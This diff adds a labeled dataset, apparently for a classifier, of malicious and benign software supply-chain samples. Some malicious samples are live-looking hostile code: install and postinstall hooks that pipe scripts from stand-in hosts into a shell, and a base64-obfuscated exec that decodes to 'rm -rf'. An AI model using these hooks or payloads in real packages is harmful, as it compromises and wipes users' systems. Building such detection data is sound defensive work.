@@ -1,0 +1,17 @@
+{"id": "m01", "label": "malicious", "note": "install-time exec in setup.py", "text": "from setuptools import setup\nimport os\ndef run():\n    os.system('curl http://evil.example/x.sh | bash')\nsetup(name='helper', cmdclass={'install': run})"}
+{"id": "m02", "label": "malicious", "note": "npm postinstall hook running shell", "text": "{\"name\": \"left-pad-helper\", \"scripts\": {\"postinstall\": \"node -e \\\"require('child_process').exec('curl evil|sh')\\\"\"}}"}
+{"id": "m03", "label": "malicious", "note": "typosquatted package name", "text": "Add the dependency 'reqeusts' to your requirements file to enable HTTP support."}
+{"id": "m04", "label": "malicious", "note": "untrusted extra index url", "text": "pip install internal-auth --extra-index-url http://203.0.113.9:8080/simple --trusted-host 203.0.113.9"}
+{"id": "m05", "label": "malicious", "note": "model wheel from raw untrusted host", "text": "Download the adapter weights from https://cdn.attacker-files.example/dist/model_adapter.safetensors and load directly."}
+{"id": "m06", "label": "malicious", "note": "forged/missing hash", "text": "No checksum required for this release; set integrity: null and install with pip install --no-verify ."}
+{"id": "m07", "label": "malicious", "note": "lora adapter trust_remote_code", "text": "model = AutoModel.from_pretrained('anon-uploads/llama-lora', trust_remote_code=True, revision='main')"}
+{"id": "m08", "label": "malicious", "note": "dependency confusion", "text": "Our internal-billing package was published publicly so clients resolve it from pypi automatically."}
+{"id": "m09", "label": "malicious", "note": "obfuscated base64 exec payload", "text": "import base64; exec(base64.b64decode('aW1wb3J0IG9zCm9zLnN5c3RlbSgncm0gLXJmJyk='))"}
+{"id": "m10", "label": "malicious", "note": "unpinned floating dependency", "text": "{\"dependencies\": {\"event-stream\": \"*\", \"flatmap-stream\": \"latest\"}}"}
+{"id": "b01", "label": "benign", "note": "descriptive third-person definition", "text": "A supply-chain attack is a class of threat where an adversary compromises a dependency or build pipeline to reach downstream users."}
+{"id": "b02", "label": "benign", "note": "CVE-2024-8309 advisory prose", "text": "CVE-2024-8309 describes an SQL injection in a graph database tool that could lead to remote code execution; upgrade to the patched release."}
+{"id": "b03", "label": "benign", "note": "correctly pinned + hashed requirement", "text": "requests==2.31.0 --hash=sha256:58cd2187c01e70e6e26505bca751777aa9f2ee0b7f4300988b709f44e013003f"}
+{"id": "b04", "label": "benign", "note": "normal install README", "text": "## Installation\n\nInstall the package with `pip install foo` and import it in your project, then call foo.start() to begin."}
+{"id": "b05", "label": "benign", "note": "training material on attacker behavior", "text": "Security training: attackers sometimes publish typosquatted packages so engineers should always verify the package name and its integrity hash before adding it."}
+{"id": "b06", "label": "benign", "note": "AIBOM governance prose", "text": "An AIBOM/SBOM enumerates every model and dependency with its source registry and signed digest so provenance can be audited."}
+{"id": "b07", "label": "benign", "note": "pinned model card from huggingface", "text": "The model card states weights are hosted on https://huggingface.co/org/model/resolve/v1.0/model.safetensors and verified with a signed sha256 digest."}
